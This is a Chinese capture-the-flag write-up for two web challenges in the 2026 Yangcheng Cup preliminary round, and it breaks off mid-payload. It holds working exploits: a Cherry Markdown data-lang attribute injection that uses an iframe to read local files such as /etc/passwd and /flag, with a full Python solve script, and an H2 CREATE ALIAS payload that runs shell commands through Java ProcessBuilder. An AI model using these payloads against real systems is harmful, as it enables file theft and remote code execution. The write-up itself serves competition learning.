---
title: 2026 年“羊城杯”网络安全大赛初赛-WEB-MISC
url: https://mp.weixin.qq.com/s/x7kPCL0JRijih8CK44QQxA
source: Doonsec's feed
date: 2026-10-24
fetch_date: 2026-10-25T07:06:45.126195
---

# 2026 年“羊城杯”网络安全大赛初赛-WEB-MISC

# 2026 年“羊城杯”网络安全大赛初赛-WEB-MISC

原创

opis
opis

玄网安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5c24XMkdfMEsE7f3nH7B8RYIvU6fib3VxKNDaqPuVJXiaiafaQVyMX8qzkLlCn3GOPqwdtRN2ABTppvDDLHicfjkokdhcCMwmaNhEA/640?wx_fmt=webp&from=appmsg)

###### WEB

# pdfchallenge

> 核心思路：Cherry Markdown 0.11.10 把代码块信息串转成小写后直接拼进 `data-lang`，并在段落消毒前缓存、消毒后还原。用 `"><iframe src="/flag">` 闭合属性，即可在关闭了 file URI 隔离的 Firefox 页面里读出本地 flag。

## 1. 题目说明

题目是一个 Markdown 转 PDF 的网页，标题为 md2pdf，页脚为 `@2hi5hu`。页面只有一个文本框。前端把文本框内容原样提交：

```
POST /render HTTP/1.1
Content-Type: text/plain

# 任意 Markdown
```

成功时响应体是 PDF。本次实例是 `http://1.14.76.59:19013`。题目没有提供源码、flag 格式或 flag 路径。

## 2. 解题思路

服务把 Markdown 渲染成 HTML，再用 headless Firefox 打开对应的 `file://` 文件并打印。Firefox 配置关掉了 `security.fileuri.strict_origin_policy`，因此这个页面里的 iframe 可以读取其他本地文件。正文中的 `<iframe>` 只会变成文本；Cherry Markdown 的代码块信息串却在 HTML 消毒之后才拼回页面。把信息串写成 `"><iframe src="/flag">`，打印结果里就会出现 `/flag` 的内容。

## 3. 解题过程

### 3.1 确认页面基地址和 file URI 策略

直接提交 `<iframe src="/etc/passwd">` 时，PDF 文本层只有这串标签，没有 `root:`。说明正文里的 iframe 没有成为子文档。

同一注入点改走代码块后，可以读到容器里的文件。`/app/package.json` 的内容是：

```
{
  "name": "md2pdf",
  "version": "1.0.0",
  "private": true,
  "dependencies": {
    "cherry-markdown": "0.11.10",
    "express": "^5.2.1",
    "jsdom": "24.1.3",
    "ws": "^8.21.3"
  }
}
```

`/app/` 下还有 `convert.js`。它的 `render(file)` 每次打印都新建 Firefox 配置，并写入：

```
user_pref("security.fileuri.strict_origin_policy", false);
```

然后用 WebDriver BiDi 打开本地文件并打印：

```
await send('browsingContext.navigate', {
  context: ctx,
  url: 'file://' + file,
  wait: 'complete',
}, 30000);
await sleep(3000);
const { data } = await send('browsingContext.print', {
  context: ctx,
  background: true,
}, 30000);
```

模块导出为 `printPdf: file => lock(() => render(file))`。实际 PDF 的 Creator 是 `Mozilla Firefox 153.5.1`，Producer 是 `cairo 1.18.4`。

因此 HTML 文档的基地址是 `file://`。iframe 的 `src="/flag"` 会被解析成 `file:///flag`。上面的偏好把 file URI 的严格同源策略关掉了，子文档可以读取 `/flag`、`/etc/passwd` 这类路径。

### 3.2 让代码块信息串变成真正的 iframe

`cherry-markdown@0.11.10` 的 `CodeBlock.beforeMakeHtml` 用围栏正则取出信息串，先 `trim().toLowerCase()`，再生成代码块 HTML 并放入缓存。占位符替换原文：

```
var $lang = lang.trim().toLowerCase();
cacheCode = _this4.cacheAndGetData(sign, function () {
  return _this4.$codeReplace($code, $lang, sign, lines);
}, 2e3, -300);
return addBlockQuoteSignToResult(_this4.getCacheWithSpace(_this4.pushCache(cacheCode, sign, lines), match));
```

引擎顺序是 `$beforeMakeHtml`、`$dealParagraph`、`$afterMakeHtml`。`CodeBlock.afterMakeHtml` 只调用 `restoreCache(html)`。段落阶段对正文 HTML 的消毒只能看到缓存占位符，看不到稍后还原出来的代码块。

还原出来的外壳由 `renderCodeBlock` 拼接。语言名再小写一次后，原样进入 `data-lang`，没有经过同文件里已有的 `escapeHTMLSpecialChar`：

```
lang = lang.toLowerCase();
var oldLang = lang;
```

同一条 `.concat` 链里，`oldLang` 没有转义就接在 `data-lang="` 后面。下面是打包文件中的连续片段：

```
"data-lang=\"").concat(oldLang, "\"\n        style=\"position:relative\"\n        class=\"").concat(needUnExpand ? "cherry-code-unExpand" : "cherry-code-expand", "\"\n      >\n      ")
```

信息串只来自开围栏那一行，换行会结束语言名。把开围栏写成：

```
```"><iframe src="/etc/passwd" width="700" height="180"></iframe>
```

`">` 先结束 `data-lang` 并关闭 `<div>`，后面的 `<iframe>` 成为独立标签。模板剩余部分变成文本。PDF 里先出现：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

紧接着是残留文本：

```
" style="position:relative" class="cherry-code-expand" >
```

这和 `data-lang` 后面的固定属性一致，说明浏览器加载的是 iframe，而不是被转义后的源码。信息串里的标签名已经是小写，`toLowerCase()` 不会把它破坏掉。

### 3.3 读取 /flag

把 `src` 换成 `/flag`。基于 `file://` 的页面会请求 `file:///flag`。用 pypdfium2 提取 PDF 文本层，得到：

```
FLAG
DASCTF{50644052674894822139765702863262}
" style="position:relative" class="cherry-code-expand" >
x
```

## 4. 完整解题脚本

```
import re
import requests
import pypdfium2 as pdfium

BASE = "http://1.14.76.59:19013"
payload = "\n".join([
    "# FLAG",
    "",
    '```"><iframe src="/flag" width="740" height="160"></iframe>',
    "x",
    "```",
    "",
])

s = requests.Session()
s.trust_env = False
r = s.post(
    BASE + "/render",
    data=payload.encode(),
    headers={"Content-Type": "text/plain"},
    timeout=90,
)
r.raise_for_status()
assert r.content.startswith(b"%PDF"), r.content[:200]

doc = pdfium.PdfDocument(r.content)
text = "\n".join(page.get_textpage().get_text_bounded() for page in doc)
print(text)
flags = re.findall(r"DASCTF\{[^}]+\}", text)
print(flags)
assert flags, "flag not found"
```

实际输出：

```
FLAG
DASCTF{50644052674894822139765702863262}
" style="position:relative" class="cherry-code-expand" >
x
['DASCTF{50644052674894822139765702863262}']
```

# GraphNexus

> 核心思路：按页面注释连接 `/ws/collab` 的 NexusFrame 二进制帧，用 `SUBSCRIBE` 取得查询权限，再把 DSL 的 `SQL()` 打进 H2，`CREATE ALIAS` 执行 SUID 程序 `/readflag`。

第 3 行

## 1. 题目说明

某企业部署知识图谱平台 GraphNexus，支持多人实时协作和图谱查询。题目要求以安全审计人员身份评估该平台并获取系统中的敏感信息。

本次实例：

* Web：`http://1.14.76.59:15916`
* WebSocket：`ws://1.14.76.59:15916/ws/collab`
* 容器映射：`nc/8080 -> 1.14.76.59:15916`

附件只有出题元数据 `problem.json`，没有服务端源码。评估只能从线上页面、接口回包和 WebSocket 帧开始。实例地址会变，下文脚本把主机和端口做成参数，默认值就是本次实例。

## 2. 解题思路

`/graph` 页内联脚本写明协作通道是自定义二进制协议 NexusFrame，端点为 `/ws/collab`。帧格式是 4 字节魔数 `NXUS`、1 字节 opcode、4 字节大端长度和载荷。

连上后服务端先发 `HELLO`。页面虽然列出了 `AUTH=0x02`，但客户端发送 `0x01`、`0x02` 都回 `UNKNOWN_OPCODE`；未订阅就发 `QUERY` 则回 `AUTH_REQUIRED`。空载荷的 `SUBSCRIBE (0x03)` 直接返回 `permissions=read,query,export,import`。因此鉴权门是订阅，不是口令。

`QUERY (0x05)` 接受一套 DSL。非法命令的错误提示给出 `SQL(query)`。该命令原样进入 H2（错误码后缀 `224`，即 H2 2.2.224）。库内业务表没有 flag，于是用 H2 的 `CREATE ALIAS ... AS $$ Java 源码 $$` 注册命令执行函数。进程身份是 `appuser`，`/flag.txt` 权限为 `root:400`，同目录的 `/readflag` 带 SUID，执行它即可读出 flag。

订阅响应已经带上 `query` 权限，建别名和执行都在这一条连接上顺序完成，不需要协议竞态。

## 3. 解题过程

### 3.1 还原 NexusFrame 并订阅

`/graph` 中的协议说明：

```
// Binary frame: [MAGIC:4B][OPCODE:1B][LENGTH:4B][PAYLOAD:NB]
// MAGIC = 0x4E585553
// Opcodes: HELLO=0x01, AUTH=0x02, SUBSCRIBE=0x03, UPDATE=0x04,
//          QUERY=0x05, EXPORT=0x06, IMPORT=0x07, RESULT=0x08
var wsUrl = 'ws://' + location.host + '/ws/collab';
```

`0x4E585553` 即 ASCII `NXUS`。用二进制 WebSocket 连上后，服务端主动发来一帧：

```
4E 58 55 53 | 01 | 00 00 00 5A | {"session":"nxs_...","protocol":"NexusFrame/2.3","encoding":"binary"}
```

`0x01` 是服务端的 HELLO，长度 `0x5A = 90`，与 JSON 字节数一致，说明长度是大端。

同一格式下，客户端行为与页面注释并不对称：

| 客户端 opcode | 载荷 | 响应 opcode | 响应 |
| --- | --- | --- | --- |
| `0x01` HELLO | 空 | `0x09` | `UNKNOWN_OPCODE` |
| `0x02` AUTH | JSON 口令 | `0x09` | `UNKNOWN_OPCODE` |
| `0x05` QUERY | `MATCH (n) RETURN n` | `0x09` | `AUTH_REQUIRED` |
| `0x03` SUBSCRIBE | 空 | `0x0A` | 见下方 JSON |

订阅的实际回包：

```
{"subscribed":true,"token":"nxs_52e3ae0fc0294ec5a2191dcb","permissions":"read,query,export,import"}
```

`token` 就是握手里的 `session`，权限里已经包含 `query`。后面的查询都发 opcode `0x05`，结果帧 opcode 是 `0x08`。

### 3.2 用 DSL 的 SQL() 确认 H2

订阅后发送 `QUERY`，载荷 `ping`，服务端不把它当 Cypher，而是返回 DSL 帮助：

```
{"error":"UNKNOWN_DSL_COMMAND","code":400,"hint":"Available: NODES.count, NODES.all, NODES.find(query), EDGES.count, SQL(query)"}
```

逐条确认后，`NODES.count` 得到 `15`，`NODES.find(Neural)` 命中 “Neural Networks”。`SQL(SELECT 1)` 返回：

```
{"result":[{"1":"1"}],"code":200}
```

列出非系统表：

```
SQL(SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA NOT IN ('INFORMATION_SCHEMA'))
```

结果只有四张 `PUBLIC` 表：`COLLAB_SESSIONS`、`KNOWLEDGE_EDGES`、`GRAPH_USERS`、`KNOWLEDGE_NODES`。`KNOWLEDGE_NODES.CONTENT` 全是 “Knowledge content for node N ...” 这种占位文本，库里没有 flag。

解析器有一个影响 payload 形状的细节：`SQL()` 取到最外层右括号；若单引号紧贴这个右括号，闭合引号会被吃掉。例如

```
SQL(SELECT ... WHERE TABLE_SCHEMA='PUBLIC')
```

实际送到 H2 的语句停在 `TABLE_SCHEMA='PUBLIC`，报 `42000-224`。字符串放在内层括号中则保留，`NOT IN ('INFORMATION_SCHEMA')` 和后面的 `CALL SH('/readflag')` 都属于这种情况。

### 3.3 注册 Java 别名并执行 /readflag

H2 允许用 `CREATE ALIAS` 把一段 Java 方法注册成 SQL 函数。先用无副作用的别名确认语句真的执行，而不是 `SQL()` 对非查询语句假成功：

```
SQL(CREATE ALIAS HELLO AS $$ String hello() { return "hi"; } $$)
SQL(CALL HELLO())
```

第二条返回 `{"result":[{"PUBLIC.HELLO()":"hi"}],"code":200}`。别名生效。

接着注册带标准错误合并的命令执行函数，再列出根目录：

```
SQL(CREATE ALIAS SH AS $$ String sh(String c) throws Exception { Process p = new ProcessBuilder("sh","-c",c).redirectErrorStream(true).start()...